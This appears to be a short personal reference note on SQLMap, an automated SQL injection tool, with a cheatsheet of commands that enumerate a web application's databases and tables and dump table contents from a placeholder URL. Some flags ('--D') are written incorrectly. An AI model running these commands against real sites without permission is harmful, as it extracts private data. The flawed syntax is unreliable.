---
tags:
  - SQL
---
SQLMap is **an automated [[SQL Injection]] tool**.
It detects and exploits SQL Injection vulnerabilities in web applications.
# Cheatsheet
```sh
# Useful for beginners, skips using flags to ask you questions in an interactive wizard instead
sqlmap --wizard

# Target the given URL
sqlmap -u http://example.domain/search/cat=1
# Extract all database names
sqlmap -u http://example.domain/search/cat=1 --dbs
# Extract the tables of a given db
sqlmap -u http://example.domain/search/cat=1 --D database_name --tables
# Dump the contents of a table
sqlmap -u http://example.domain/search/cat=1 --D database_name -T table_name --dump
```